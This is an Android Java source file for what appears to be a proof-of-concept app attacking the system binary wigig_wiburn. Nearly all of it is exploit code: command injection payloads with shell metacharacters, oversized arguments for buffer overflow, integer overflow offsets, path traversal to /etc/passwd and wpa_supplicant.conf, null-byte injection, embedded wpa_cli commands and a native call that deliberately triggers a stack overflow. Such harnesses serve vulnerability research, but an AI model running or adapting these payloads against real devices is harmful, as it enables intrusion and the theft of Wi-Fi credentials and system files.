package com.wigig.poc;

import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;
import android.view.View;
import android.widget.TextView;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class MainActivity extends AppCompatActivity {
    private TextView tvOutput;
    private final StringBuilder log = new StringBuilder();

    static { System.loadLibrary("wigig_poc"); }
    public native String testNativeCommand(String cmd);
    public native void triggerStackOverflow(String longParam);

    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvOutput = findViewById(R.id.tv_output);

        findViewById(R.id.btn_cmd_inj).setOnClickListener(v -> testCmdInjection());
        findViewById(R.id.btn_overflow).setOnClickListener(v -> testOverflow());
        findViewById(R.id.btn_int_overflow).setOnClickListener(v -> testIntOverflow());
        findViewById(R.id.btn_path_traversal).setOnClickListener(v -> testPathTraversal());
        findViewById(R.id.btn_hidl_cmd).setOnClickListener(v -> testHidlCommandEmbed());
        findViewById(R.id.btn_null_byte).setOnClickListener(v -> testNullByte());
        findViewById(R.id.btn_native).setOnClickListener(v -> testNative());
    }

    private void append(String s) { log.append(s).append("\n"); tvOutput.setText(log.toString()); }

    // 1. コマンドインジェクション（メタ文字）
    private void testCmdInjection() {
        append("=== コマンドインジェクション ===");
        String[] payloads = {
            "SPARROW; ls -l /data/",
            "SPARROW| id",
            "\"SPARROW\" && echo injected",
            "SPARROW\nid",
            "SPARROW`ls`"
        };
        for (String p : payloads) {
            append("Payload: " + p);
            exec("/system/bin/wigig_wiburn", "-device", p, "-burn");
        }
    }

    // 2. バッファオーバーフロー
    private void testOverflow() {
        append("=== 長大引数 (5000文字) ===");
        String longStr = new String(new char[5000]).replace('\0', 'A');
        exec("/system/bin/wigig_wiburn", "-device", longStr, "-burn");
        exec("/system/bin/wigig_wiburn", "-interface", longStr, "-device", "SPARROW");
    }

    // 3. 整数オーバーフロー
    private void testIntOverflow() {
        append("=== 整数オーバーフロー ===");
        exec("/system/bin/wigig_wiburn", "-read", "-offset", "0xFFFFFFFFFFFFFFFF", "-length", "0x80000000", "-device", "SPARROW");
        exec("/system/bin/wigig_wiburn", "-burn", "-offset", "-1", "-length", "1", "-device", "SPARROW");
    }

    // 4. パストラバーサル
    private void testPathTraversal() {
        append("=== パストラバーサル ===");
        exec("/system/bin/wigig_wiburn", "-fw", "../../../system/etc/hosts", "-device", "SPARROW");
        exec("/system/bin/wigig_wiburn", "-ids", "../../../data/misc/wifi/wpa_supplicant.conf", "-device", "SPARROW");
        exec("/system/bin/wigig_wiburn", "-setup_ini", "/data/local/tmp/../../../../etc/passwd", "-device", "SPARROW");
    }

    // 5. HIDLコマンド埋め込み (wpa_cli 風コマンドを引数に仕込む)
    private void testHidlCommandEmbed() {
        append("=== HIDLコマンド埋め込み (wpa_cli) ===");
        // 実際に wigig_wiburn が -interface 経由で SuppTunnel.doCommand() を呼ぶ場合を想定
        exec("/system/bin/wigig_wiburn", "-interface", "wlan0", "-device", "SPARROW", "-fw", "PING");
        exec("/system/bin/wigig_wiburn", "-interface", "wlan0; LIST_NETWORKS", "-device", "SPARROW");
        exec("/system/bin/wigig_wiburn", "-interface", "wlan0| wpa_cli status", "-device", "SPARROW");
    }

    // 6. Nullバイトインジェクション
    private void testNullByte() {
        append("=== Nullバイトインジェクション ===");
        exec("/system/bin/wigig_wiburn", "-device", "SPARROW%00; ls", "-burn");
        exec("/system/bin/wigig_wiburn", "-fw", "/sdcard/fw.ini%00; echo exploited", "-device", "SPARROW");
    }

    // 7. JNI デモ
    private void testNative() {
        append("=== JNI スタックオーバーフロー実演 ===");
        String longStr = new String(new char[300]).replace('\0', 'X');
        triggerStackOverflow(longStr);
        append("Native popen 結果: " + testNativeCommand("ls -l /data/"));
    }

    private void exec(String... cmd) {
        try {
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = r.readLine()) != null) append(line);
            append("Exit: " + p.waitFor());
        } catch (Exception e) { append("例外: " + e.getMessage()); }
    }
}
